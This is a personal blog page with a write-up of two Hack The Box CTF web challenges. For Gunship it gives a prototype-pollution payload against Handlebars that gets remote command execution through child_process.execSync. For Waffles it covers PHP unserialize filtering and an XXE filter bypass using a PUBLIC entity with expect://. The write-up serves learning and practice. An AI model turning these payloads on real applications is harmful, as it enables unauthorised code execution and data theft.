---
permalink: /portfolio/htb_ctf/
author: Rick Theeuwes

defaults:
  # _pages
  - scope:
      path: ""
      type: pages
    values:
      layout: single
      author_profile: true
toc: true
title: HTB CTF
---

## Gunship

Gunship is an easy web challenge with one-star difficulty. It is a simple website that asks you for the name of a band member you like best and then responds with `Hello guest, thank you for letting us know!`. After throwing some tests at it, we started looking through the code. There we found this:

```js
// unflatten seems outdated and a bit vulnerable to prototype pollution
// we sure hope so that po6ix doesn't pwn our puny app with his AST injection on template engines
```

Ah! This application is vulnerable to AST injection! And apparently, some po6ix can pwn this. After a quick google we found the page of this po6ix and he has a nice blog post about AST injection. ([source](https://blog.p6.is/AST-Injection/)) AST pollution is a where you can abuse JavaScript's prototype system to write into the memory. JS's prototyping is setting a default static value to an object, which is always read first. So being able to write into objects is a very good way to exploit an application.

There first tested payload is:

```json
{
  "artist.__proto__.name": "Westaway"
}
```

This sets the name value of artist to always be "Westaway", this way we will always get a reply via `handebars`, which is vulnerable for AST pollution. So let's exploit the `handlebars`

```json
{
"__proto__.pendingContent": "test"
}
```

![response](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/ctf/response.png)

This replaces every reply made with handlebars with "test". This is a very good way to get data out of the application. After that we can see how we exploit this system. As we look further to po6ix's blog, there is an RCE in handlebars. The blog shows that this payload can lead to an RCE:

```json
"__proto__.type": "Program",
"__proto__.body": [{
  "type": "MustacheStatement",
  "path": 0,
  "params": [{
    "type": "NumberLiteral",
    "value": "process.mainModule.require('child_process').execSync('id')"
  }],
  "loc": {
    "start": 0,
    "end": 0
  }
}]
```

The `type` states that the body is a Program, or something to execute. Then the value of the parameter is executed. In this case it just runs `id` in the shell. We cannot read the value of this, because it is not written anywhere. For that, we edit the `value` to:

```json
"value": "Object.prototype.pendingContent = process.mainModule.require('child_process').execSync('id').toString()"
```

![result](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/ctf/result.png)

Alright, now we have an RCE, but it seems that we cannot execute more than one command, because the system will not accept a second command. But, we can reset the machine and we only need one command.

From the `entrypoint.sh` we know where the flag is and that it starts with `flag` and then 5 random characters. So we want to read all files with starting with flag.

```bash
# Generate random flag filename
FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
mv /app/flag /app/flag$FLAG
```

So my payload is this:

![payload](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/ctf/payload.png)

![flag](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/ctf/flag.png)

We execute the payload to read all files starting with flag and then we write it into the pendingContent. The second response uses handlebars, so the pendingContent is also sent. With gives us the flag!

HTB{wh3n_l1f3_g1v3s_y0u_p6_st4rt_p0llut1ng_w1th_styl3}

## Waffles

The second challenge I worked on was waffles, this was a more difficult web challenge. A PHP website where you can order a waffle or icecream. This is a three-star challenge.

The initial page is just a simple webpage where you can enter a table number to order waffles or ice cream. After looking at the code, we can see that the `PHPSESSION` cookie is vulnerable to a PHP unserialize exploit. The model that can and probably should be called is the `XmlParserModel.php`. The downside is that both the unserialize and the XML functions are protected by a Regex-check.

Let's start at the start, the cookie desrializes to:

```php
O:9:"UserModel":1:{s:8:"username";s:10:"guest_5fb8";}
```

PHP serialize is very similar to JSON. However, when serialize is used, certain 'magic methods' are called in the object. The XmlParserModel has one of the magic methods, so if we can create this model, then we can abuse this method.

Creating the XmlParserModel should be as easy as changing the cookie to:

```php
O:15:"XmlParserModel":1:{s:4:"data";s:10:"guest_5fb8";}
```

However, some Regex is preventing that:

```regex
'/(^|;)O:\d+:"([^"]+)"/'
```

This regex filters the text out that states the object name, by checking if it starts with a ; or the beginning of the string. Then followed by a colon, a number, a colon, an O and then it finds the objects name. Then, it uses the following code to find out if the object has a magic method (starting with `__`), if it does, it is rejected.

```php
$matches = [];
$num_matches = preg_match_all('/(^|;)O:\d+:"([^"]+)"/', $serialized_data, $matches);

for ($i = 0; $i < $num_matches; $i++) {
    $methods = get_class_methods($matches[2][$i]);
    foreach ($methods as $method) {
        if (preg_match('/^__.*$/', $method) != 0) {
            die("Unsafe method: ${method}");
        }
    }
```

This is the part I got stuck on. No matter what I did, either the payload was invalid, or the regex triggered it.

Okay, say we did get past the first check, what would happen if we got into the XmlParserModel? 

```php
public function __wakeup()
{        
    if (preg_match_all("/<!ENTITY\s+[^\s]+\s+SYSTEM\s+[\'\"](?i:file|http|https|ftp|php|zlib|data|glob|expect|zip):\/\//mi", $this->data))
    {
        die('Unsafe XML');
    }
    $env = simplexml_load_string($this->data, 'SimpleXMLElement', LIBXML_NOENT);
    foreach ($env as $key => $value)
    {
        $_ENV[$key] = (string)$value;
    }
}
```

Okay, as we talked about before, the `__wakeup()` function is a magic method that is run when the object is deserialized. Then the regex checks if the XML text contains XXE. A normal XXE payload like:

```xml
<!DOCTYPE bar [<!ENTITY file SYSTEM "expect://id">]>
<env>
  <foo>&file;</foo>
</env>
```

Does not work, because it contains `SYSTEM` and then `expect`. However, XML has something else: `public`. Public is very similair to `SYSTEM`, but made to be used external, so you need to give it a name. The resulting payload is:

```xml
<!DOCTYPE bar [<!ENTITY file PUBLIC "public" "expect://id">]>
<env>
  <foo>&file;</foo>
</env>
```

This does the same as the first payload, however, the Regex could not detect it. This could be expanded to a full RCE exploit to gain the flag, but without the ability to get past the first check, I saw no reason for finding out how to extract the flag.
